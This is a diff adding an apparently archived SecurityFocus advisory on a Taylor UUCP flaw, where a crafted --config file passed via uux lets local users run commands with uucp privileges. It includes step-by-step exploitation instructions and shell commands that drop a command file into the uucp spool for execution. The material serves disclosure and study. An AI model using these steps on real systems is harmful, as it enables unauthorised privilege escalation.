@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/3312/info
+
+Taylor UUCP is an implementation of the UUCP package written originally by Ian Lance Taylor.
+
+A problem has been discovered in Taylor UUCP that makes it possible for local users to gain elevated privileges. The problem is due to the handling of configuration files when passed to uucp via the --config flag. When uux receives a request to execute commands using a malicious --config file, the commands will be executed with the privileges of uuxqt, a setuid uucp daemon by default.
+
+This makes it possible for a local user to gain elevated privileges, and could lead to a local user gaining administrative access. 
+
+uux 'uucp --config=/tmp/vv.v /tmp/somefile /tmp/someotherfile'
+
+will use the supplied configuration, without dropping privileges.
+
+1) Make a configuration file that allows any command to be executed, and allows files from anywhere to be copied to anywhere that is writable by uid/gid uucp. ( /tmp/config.uucp )
+2) Make a command file with the command you want to be executed.
+( /tmp/commands.uucp )
+3) Do something like the following:
+
+$ THISHOST=`uuname -l`
+$ WHEREYOUWANTIT=/var/spool/uucp/${THISHOST}/X./X.${THISHOST}X1337
+$ uux 'uucp --config=/tmp/config.uucp /tmp/commands.uucp '${WHEREYOUWANTIT}
+
+The commands in /tmp/commands.uucp file will be executed by uuxqt, with the uid/gid of uucp. 
